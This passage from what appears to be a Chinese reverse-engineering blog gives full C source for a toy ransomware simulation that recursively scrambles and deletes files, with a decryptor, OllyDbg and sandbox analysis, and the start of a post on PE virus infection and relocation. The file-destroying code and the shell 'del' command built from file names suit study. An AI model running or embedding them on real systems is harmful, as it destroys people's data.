禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span>(findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//加密文件</span></span><br><span class="line">jiami(temp, pathName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line"><span class="comment">//加密指定文件夹目录 建议使用虚拟机执行</span></span><br><span class="line">findFile(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.8.png" class=""><p>可以看到修改日期是今天，创建日期也是今天，因为原本的文件都被删除了。并且文件都加了密，文件文件乱码、图片不能显示、EXE也不能执行。</p><img src="/posts/5ec21076/1.1.9.png" class=""><p>6.编写解密功能。</p><p>当我们中了勒索病毒，就需要解密。在真实环境中，MD5、hash、SHA-1都是比较常用的加密算法。编写解密功能有两种方法：</p><ul><li>全部读入内存，修改后重新存入文件</li><li>边读边写到另一新建文件，要修改的部分修改后存入新建文件，其它部分原封不动写入，写完删除加密文件，并将这个新文件改为加密文件的名字</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                     <span class="comment">//文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="comment">//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">FILE* fpw = fopen(temp, <span class="string">&quot;wb&quot;</span>);         <span class="comment">//写入文件</span></span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123; </span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">fputc(code, fpw);</span><br><span class="line"><span class="comment">//printf(&quot;%c\n&quot;, ch);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);</span><br><span class="line">rename(temp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件解密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiemi</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                        <span class="comment">//文件大小</span></span><br><span class="line">FILE* fp;                           <span class="comment">//打开文件</span></span><br><span class="line">FILE* fpw;                           <span class="comment">//写入文件</span></span><br><span class="line"><span class="type">char</span> tmp[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化操作</span></span><br><span class="line"><span class="built_in">memset</span>(tmp, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s\\tmp&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, tmp);</span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">fpw = fopen(tmp, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">fseek(fpw, <span class="number">0</span>, SEEK_SET);             <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//每隔一个字节删除一个字节数据</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123;</span><br><span class="line">ch = fgetc(fp);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == (i % <span class="number">2</span>)) &#123; <span class="comment">//偶数写入</span></span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);</span><br><span class="line">rename(tmp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span>(findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密或解密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//加密文件</span></span><br><span class="line"><span class="comment">//jiami(temp, pathName);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解密文件</span></span><br><span class="line">jiemi(temp, pathName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//加解密指定文件夹目录 建议使用虚拟机执行</span></span><br><span class="line">findFile(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果如下：</p><img src="/posts/5ec21076/1.2.1.png" class=""><p>除了文本文件其它文件都复原了，这是为什么😓但是复原的文件都比最初始的文件多了2个字节，救命我也不知道为什么，可能是字符<code>\0</code>之类的？</p><h1 id="2-OD逆向分析加密PE文件"><a href="#2-OD逆向分析加密PE文件" class="headerlink" title="2. OD逆向分析加密PE文件"></a>2. OD逆向分析加密PE文件</h1><p>将上面编写的代码编译成EXE文件，我是拿去32位Win 7系统上编译的，这样编译出来的EXE也是32位，才能加载进OD分析。</p><img src="/posts/5ec21076/2.1.1.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main</span><br></pre></td></tr></table></figure><p>载入OD后，右键 -&gt; 查找 -&gt; 当前模块中的名称，查看该EXE调用到了哪些API函数。</p><img src="/posts/5ec21076/2.1.2.png" class=""><p>选中<code>FindFirstFileA()</code>右键 -&gt; 在每个参考上设置断点，如果在断点窗口没有看到断点，也就是断点没下成功，那就用另一种方法：在CPU窗口右键 -&gt; 查找 -&gt; 所有模块间的调用，找到<code>FindFirstFileA()</code>右键 -&gt; 在每个调用到 FindFirstFileA 上设置断点，找到两处。在断点窗口中选中某一个断点右键 -&gt; 反汇编窗口中跟随，可以查看这条指令上下有什么特别的指令。</p><p>运行，第一次断下显示：</p><img src="/posts/5ec21076/2.1.3.png" class=""><p>第二次断下显示：</p><img src="/posts/5ec21076/2.1.4.png" class=""><p>继续F7调试发现可以看到参数传递、字符串拼接、睡眠函数等内容，重点是我们要通过call分析进入到加密函数中，然后去分析加密函数里的算法从而实现逆向破解。</p><p>在逆向分析的过程中，需要思考几个问题：</p><ul><li>OD逆向怎么判断恶意样本执行或检测了哪些文件</li><li>OD逆向怎么判断恶意样本是否具有注册表操作、系统进程获取、屏幕截屏等操作</li><li>OD逆向怎么判断恶意样本的网络操作，IP地址、邮箱、域名访问请求情况</li><li>OD逆向怎么判断恶意样本是否具有蠕虫传播感染功能</li><li>怎么溯源一个恶意样本</li></ul><h1 id="3-在线沙箱分析"><a href="#3-在线沙箱分析" class="headerlink" title="3. 在线沙箱分析"></a>3. 在线沙箱分析</h1><p>在恶意样本逆向分析中，在线平台给我们提供了强大的支撑，我们拿到一个样本后可以先对其进行在线监测。其操作比较简单，就是将恶意样本上传至指定在线网址即可。常见的在线沙箱分析包括：</p><ul><li><a href="https://www.virustotal.com/">VirusTotal沙箱</a></li><li><a href="https://ti.qianxin.com/">360沙箱</a></li><li><a href="https://cuckoo.cert.ee/">Cuckoo沙箱</a></li><li><a href="https://s.threatbook.cn/">微步沙箱</a></li></ul><p>以VirusTotal沙箱为例，将我们的<code>main.exe</code>传上去，等待它检测。结果67家安全供应商中只有9家没有将这个文件标记为恶意文件。</p><img src="/posts/5ec21076/3.1.png" class=""><p>我们还可以看到样本的基本信息、文件历史信息以及PE文件节点信息。</p><img src="/posts/5ec21076/3.2.png" class=""><p>如果样本有恶意家族关联，它也能给出相应的信息。</p><img src="/posts/5ec21076/3.3.png" class="">]]></content>
    
    
    <summary type="html">&lt;p&gt;勒索病毒是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。&lt;/p&gt;
&lt;p&gt;现在就用C语言来实现一下系统文件加密及解密功能，简单模拟勒索病毒的加解密原理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows PE病毒分类及感染方式</title>
    <link href="http://example.com/posts/adc1352a.html"/>
    <id>http://example.com/posts/adc1352a.html</id>
    <published>2022-05-22T00:36:31.469Z</published>
    <updated>2022-05-28T13:02:54.369Z</updated>
    
    <content type="html"><![CDATA[<p>以后我们很长时间都要与Windows PE病毒打交道，所以在这里就先了解下它的分类及感染方式吧。</p><span id="more"></span><h1 id="1-PE病毒的概念"><a href="#1-PE病毒的概念" class="headerlink" title="1. PE病毒的概念"></a>1. PE病毒的概念</h1><p>PE病毒又称为Win32 PE病毒，或称为Win32病毒，它指所有Windows下PE文件格式文件的感染病毒。因为它通常采用Win32汇编编写，而且格式为PE文件，因此得名。</p><p>PE病毒是以Windows PE程序为载体，能寄生于PE文件或Windows系统的病毒程序。</p><p>感染是指在尽量不影响目标程序(系统)正常功能的前提下，而使其具有病毒自身的功能。一个病毒通常包括如下模块：</p><ul><li>感染模块：被感染程序同样具备感染能力</li><li>触发模块：在特定条件下实施相应的病毒功能，比如日期、键盘输入等</li><li>破坏模块：网络攻击行为，推荐攻击链或ATT&amp;CK</li><li>其他模块</li></ul><p>如果我们要编写或分析PE病毒，则需要掌握以下关键信息：</p><ul><li>病毒的重定位</li><li>获取API函数地址</li><li>文件搜索</li><li>内存映射文件</li><li>病毒如何感染其它文件</li><li>病毒如何返回到Host程序</li></ul><h1 id="2-PE病毒分类"><a href="#2-PE病毒分类" class="headerlink" title="2. PE病毒分类"></a>2. PE病毒分类</h1><p>以感染目标进行分类，包括文件感染和系统感染。</p><h2 id="2-1-文件感染"><a href="#2-1-文件感染" class="headerlink" title="2.1 文件感染"></a>2.1 文件感染</h2><p>将代码寄生在PE文件，病毒本身只是PE文件的一部分，依赖于感染目标，通常也叫Host文件，控制权获得也是以目标程序运行来获得的。分为：</p><ul><li>传统感染型：以Win32汇编程序编写为主</li><li>捆绑释放型：编写难度较低，通过高级语言均可编写，将目标程序和病毒程序捆在一起，和捆绑器有相似之处</li></ul><h2 id="2-2-系统感染"><a href="#2-2-系统感染" class="headerlink" title="2.2 系统感染"></a>2.2 系统感染</h2><p>将代码或程序寄生在Windows操作系统，该类病毒越来越多，它不感染具体文件，但是它会在操作系统中保存自己的实体，同时也可以通过系统启动的方法来获得控制权。传播途径包括即时通信软件、U盘、光盘、电子邮件、网络共享等。</p><h1 id="3-传统文件感染型"><a href="#3-传统文件感染型" class="headerlink" title="3. 传统文件感染型"></a>3. 传统文件感染型</h1><h2 id="3-1-感染思路"><a href="#3-1-感染思路" class="headerlink" title="3.1 感染思路"></a>3.1 感染思路</h2><p>如下图所示，左边是一个正常的PE文件，右边是PE病毒感染该程序时的修改，病毒代码以新节的形式附在程序最后面。我们知道PE文件是由多个节组成的，病毒代码为了融入目标程序会以节的形式，同时修改PE文件头。</p><img src="/posts/adc1352a/3.1.1.png" class="" title="传统文件感染"><p>对感染来说，它一方面需要使得宿主具备自己的功能，另一方面也不破坏宿主程序的功能。所以病毒代码执行完毕之后，它必须将控制权交还给宿主，以免自己被发现。</p><ul><li>优点：被感染后的程序主体依然是目标程序，不影响目标程序图标，隐蔽性稍好。</li><li>缺点：对病毒代码的编写要求较高，通常是汇编语言编写；难以成功感染自校验程序。</li></ul><h2 id="3-2-感染的基本流程"><a href="#3-2-感染的基本流程" class="headerlink" title="3.2 感染的基本流程"></a>3.2 感染的基本流程</h2><p>比如某个Windows PE病毒只感染当前目录下的<code>test.exe</code>文件，它没有破坏性。<code>test.exe</code>被感染后，首先执行病毒代码，然后执行自身代码。假设在当前目录下存在4个文件：</p><ul><li>calc.exe：计算器</li><li>notepad.exe：记事本</li><li>test.exe：测试PE文件</li><li>main.exe：PE病毒程序</li></ul><p><code>test.exe</code>文件原始大小为2.5KB，程序入口地址为<code>00401000</code>。运行<code>main.exe</code>文件后，<code>test.exe</code>文件大小变为6.5KB，入口地址变为<code>004042DC</code>，也就是病毒代码的地址。病毒将被感染的<code>test.exe</code>重命名为<code>test-ok.exe</code>，然后将当前目录下某一个<code>.exe</code>文件(比如记事本)重命名为<code>test.exe</code>，如果我们运行测试PE文件，也就是<code>test-ok.exe</code>，它也能像<code>main.exe</code>一样去感染记事本，感染完后将记事本重命名为<code>test-oo.exe</code>，计算器也是如此被感染。</p><h2 id="3-3-关键技术"><a href="#3-3-关键技术" class="headerlink" title="3.3 关键技术"></a>3.3 关键技术</h2><h3 id="3-3-1-重定位"><a href="#3-3-1-重定位" class="headerlink" title="3.3.1 重定位"></a>3.3.1 重定位</h3><p>重定位在DLL文件尤其常见，因为DLL文件会加载到不同的位置，如果再按照VA定位会出错。对于病毒程序也是一样，它有相应的代码区感染目标程序，而目标程序有很多，病毒代码写在目标程序的什么位置呢？这就需要病毒代码去定位目标程序的位置，就要利用重定位技术。</p><ul><li>关键点：病毒代码寄生在目标程序的位置不固定</li><li>shellcode类似：通常需要注入远程系统，但这段代码在远程系统什么位置有时不能确定，另外远程系统的环境有时也不能准确感知，故需要使用重定位和API函数自动获取</li></ul><p>如下图所示，左边是病毒的RVA，其地址为<code>004010xx</code>；右图是当这段代码插入到另一个Host文件后，变量的实际位置和预期位置出现了差异，而重定位的关键是知道这个差异值是多少，后续遇到的各种变量或地址都可以通过这种差异方式校正。</p><img src="/posts/adc1352a/3.3.1.png" class="" title="重定位原因"><p>但是根据Host特征逐一硬编码这种方式并不可取，繁琐且未必准确，所以采用另一种方法，那就是病毒代码运行过程中自我重定位。</p><p>假设一个变量相对于病毒起始位置的偏移是9h，那么只要通过求得病毒插入到被感染对象后的病毒起始位置 + 这个变量相对于病毒起始位置的偏移 = 变量在被感染对象中的位置。</p><p><strong>那么如何求得插入感染对象后的病毒起始位置呢？</strong>由于每个被感染对象的大小都不一样，所以病毒插入到被感染对象后的起始位置也是不一样的。</p><p>首先我们要知道一些前置知识。call指令的作用是将下一条指令的地址压入堆栈，然后设置eip寄存器指向要跳转的地址。比如下面这两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00C9AF58   .  E8 93020000   call Crackme_.00C9B1F0</span><br><span class="line">00C9AF5D   .  6A 01         push 0x1</span><br></pre></td></tr></table></figure><p>F7进入函数，此时堆栈窗口栈顶数据为<code>00C9AF5D</code>，也就是call指令的下一条指令的地址；eip寄存器显示<code>00C9B1F0</code>，也就是指向要跳转的地址。</p><img src="/posts/adc1352a/3.3.2.png" class="" 